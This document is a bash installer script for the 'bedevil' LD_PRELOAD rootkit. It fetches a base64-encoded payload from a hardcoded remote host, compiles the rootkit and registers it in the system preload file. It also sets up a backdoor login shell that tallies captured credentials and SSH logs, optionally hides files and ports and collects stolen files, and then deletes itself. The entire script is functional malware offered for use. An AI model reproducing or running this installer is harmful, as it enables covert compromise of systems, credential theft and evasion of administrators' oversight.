#!/bin/bash

# the following is required for this to work as intended:
#   - wget or curl, base64 & tar

# change this..
B64TARGZ_LOCATION="http://192.168.0.48:9001/imgay.b64"
# no need to touch anything else...

# enter this directory when installing. change if needed.
WORKDIR="/tmp"

# if there are >0 args passed to this function, treat each arg as a path & rm each before exiting
emergency_exit(){
    if [ ! -z "$1" ]; then
        local files=($@)
        for f in ${files[@]}; do rm -rf $f; done
    fi
    exit
}
bin_path(){ echo -n `which $1 2>/dev/null || echo -n "nahhh"`; }
dlfile(){ # $1 = src, $2 = dest
    [ $DWNLDR == "wget" ] && DL_C="$DWNLDR -q $1 -O $2"
    [ $DWNLDR == "curl" ] && DL_C="$DWNLDR -s $1 -o $2"
    $DL_C || { echo 'failed downloading target file.'; emergency_exit $2; }
}
mktouch(){ mkdir -p `dirname "$1"` && touch "$1"; }

# no need to manually change these settings anymore.
USE_CRYPT=0; HIDE_SELF=0; HIDE_PORTS=0; FILE_STEAL=0; LOG_SSH=0
read_toggles(){ # $1 = path of conf
    local conf="$1"
    [ ! -f "$conf" ] && { echo "specified file doesn't exist. exiting."; exit; }
    while read -r line; do
        [ "$line" == 'USE_CRYPT=1' ] && USE_CRYPT=1
        [ "$line" == 'HIDE_SELF=1' ] && HIDE_SELF=1
        [ "$line" == 'HIDE_PORTS=1' ] && HIDE_PORTS=1
        [ "$line" == 'FILE_STEAL=1' ] && FILE_STEAL=1
        [ "$line" == 'LOG_SSH=1' ] && LOG_SSH=1
    done <<< "`cat $conf`"
}

# do prerequisite checks now
[ `id -u` != 0 ] && { echo "not root" && exit; }

[ -f `bin_path wget` ] && DWNLDR="wget"
[ -f `bin_path curl` ] && DWNLDR="curl"
[ -z $DWNLDR ] && { echo "you need wget/curl... install one." && exit; }
[ ! -f `bin_path base64` ] && { echo "missing base64 util... install it." && exit; }
[ ! -f `bin_path tar` ] && { echo "missing tar...? install it." && exit; }

echo -e "\n\tBEGINNING INSTALLATION.\n"
SCRIPT_PATH="`pwd`/$0"
echo "entering workdir" && cd $WORKDIR

[[ "$B64TARGZ_LOCATION" != *"/"* ]] && { echo "no path in url." && exit; }

# dsfghdjghkj
[[ "$B64TARGZ_LOCATION" == "http"* ]] && \
    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $3}'`"
[[ "$B64TARGZ_LOCATION" != "http"* ]] && \
    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $1}'`"
echo "got host $HOST"

B64TARGZ_FILENAME="`basename $B64TARGZ_LOCATION`"
echo "downloading b64 tarball"
dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME
TARGZ_NAME="${B64TARGZ_FILENAME}.tar.gz"
echo "archive name: $TARGZ_NAME"

echo "reverting b64 into orig tar"
cat $B64TARGZ_FILENAME | base64 -d > $TARGZ_NAME || { echo "couldn't revert b64 to orig tar" && emergency_exit $B64TARGZ_FILENAME $TARGZ_NAME; }
[ ! -f $TARGZ_NAME ] && { echo "tar doesn't exist...? exiting." && emergency_exit $B64TARGZ_FILENAME; }

INCLUDE_DIR="`tar tzf $TARGZ_NAME | head -1 | cut -f1 -d"/"`"
echo "got tar. extracting it."
tar xpfz $TARGZ_NAME >/dev/null && echo "done. removing it." && rm $TARGZ_NAME $B64TARGZ_FILENAME
[ ! -d "$INCLUDE_DIR" ] && { echo "include dir doesn't exist...? exiting."; emergency_exit $TARGZ_NAME $B64TARGZ_FILENAME; }

echo -e "\ngetting settings"
settings=(`cat $INCLUDE_DIR/settings | grep -o '^[^#]*'`)
MAGIC_GID=${settings[0]} && INSTALL_DIR=${settings[1]}
LDSO_PRELOAD=${settings[2]} && BDVLSO=${settings[3]}
SOPATH=${settings[4]} && HIDEPORTS=${settings[5]}
SSH_LOGS=${settings[6]} && INTEREST_DIR=${settings[7]}
BD_VAR=${settings[8]}

echo -e "getting toggle statuses\n"
read_toggles $INCLUDE_DIR/toggles.conf
echo "MAGIC_GID: $MAGIC_GID"; echo "INSTALL_DIR: $INSTALL_DIR"
echo "LDSO_PRELOAD: $LDSO_PRELOAD"; echo "BDVLSO: $BDVLSO"
echo "SOPATH: $SOPATH"; echo "BD_VAR: $BD_VAR"
[ $HIDE_PORTS == 1 ] && echo "HIDEPORTS = $HIDEPORTS"
[ $LOG_SSH == 1 ] && echo "SSH_LOGS = $SSH_LOGS"
[ $FILE_STEAL == 1 ] && echo "INTEREST_DIR = $INTEREST_DIR"
echo -e "done getting config values\n"

echo "compiling rootkit"
LINKER_FLAGS=(-ldl)
[ $USE_CRYPT == 1 ] && LINKER_FLAGS+=(-lcrypt)
WARNING_FLAGS="-Wall" && OPTIMIZATION_FLAGS="-O0 -g0"
OPTIONS="-fomit-frame-pointer -fPIC" && LINKER_OPTIONS="-Wl,--build-id=none"
PLATFORM="`uname -m`"
[ $PLATFORM == "armv7l" ] && PLATFORM="v7l"
[ $PLATFORM == "armv6l" ] && PLATFORM="v6l"
gcc -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.$PLATFORM
gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.i686 &>/dev/null
strip $INCLUDE_DIR/$BDVLSO.$PLATFORM 2>/dev/null || { echo "couldn't strip rootkit, exiting"; emergency_exit $INCLUDE_DIR; }
[ -f $INCLUDE_DIR/$BDVLSO.i686 ] && strip $INCLUDE_DIR/$BDVLSO.i686
echo "rootkit compiled"
echo "installing"
[ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR
mv $INCLUDE_DIR/$BDVLSO.$PLATFORM $INSTALL_DIR/
[ -f $INCLUDE_DIR/$BDVLSO.i686 ] && mv $INCLUDE_DIR/$BDVLSO.i686 $INSTALL_DIR/

echo -e "\nrootkit installed"
echo "now preparing stuff"

echo "setting up .bashrc"
BASHRC="tty -s || return
[ ! -z \$TERM ] && export TERM=xterm
[ \$(id -u) != 0 ] && su root
[ \$(id -u) != 0 ] && kill -9 \$\$
[ -f ~/BD_README ] && cat ~/BD_README | less --tilde -J -d && rm ~/BD_README

# only show .ascii on first login.
[ -f ~/.ascii ] && printf \"\\e[1m\\e[31m\`cat ~/.ascii\`\\e[0m\\n\"

alias ls=\"ls --color=auto\"
alias ll=\"ls --color=auto -AlFhn\"

id && who
[ -f ~/auth_logs ] && echo -e \"\\e[1mLogged accounts: \\e[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\e[0m\"
[ -f ~/ssh_logs ] && echo -e \"\\e[1mSSH logs: \\e[1;31m\$(cat ~/ssh_logs | wc -l)\\e[0m\""
echo -n "$BASHRC" > $INSTALL_DIR/.bashrc
echo -n ". .bashrc" > $INSTALL_DIR/.profile

[ $HIDE_PORTS == 1 ] && { mktouch $HIDEPORTS && chmod 644 $HIDEPORTS && ln -s $HIDEPORTS $INSTALL_DIR/hideports && cat $INCLUDE_DIR/hideports > $INSTALL_DIR/hideports; }
[ $FILE_STEAL == 1 ] && { mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir; }
[ $LOG_SSH == 1 ] && { mktouch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; } 
if [ $HIDE_SELF == 1 ]; then
    echo "hiding everything"

    HIDE_FILES+=($LDSO_PRELOAD $INSTALL_DIR $INSTALL_DIR/*
                 $INSTALL_DIR/.bashrc $INSTALL_DIR/.profile)

    [ $LOG_SSH == 1 ] && HIDE_FILES+=($SSH_LOGS)
    [ $FILE_STEAL == 1 ] && HIDE_FILES+=($INTEREST_DIR)
    [ $HIDE_PORTS == 1 ] && HIDE_FILES+=($HIDEPORTS)

    for file in ${HIDE_FILES[@]}; do
        [ ! -f $file ] && mktouch $file
        chown -h 0:$MAGIC_GID $file
    done
fi

rm -r $INCLUDE_DIR

echo "writing \$SOPATH to \$LDSO_PRELOAD"
echo -n "$SOPATH" > $LDSO_PRELOAD || { echo "failed writing to \$LDSO_PRELOAD. exiting"; emergency_exit $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR; }
echo; echo -e "installation finished\nconnect using your backdoor credentials\n"; echo
 
[ -f $SCRIPT_PATH ] && [[ "`cat $SCRIPT_PATH | head -n1`" == *'#!/bin/bash'* ]] && rm -f $SCRIPT_PATH
exit
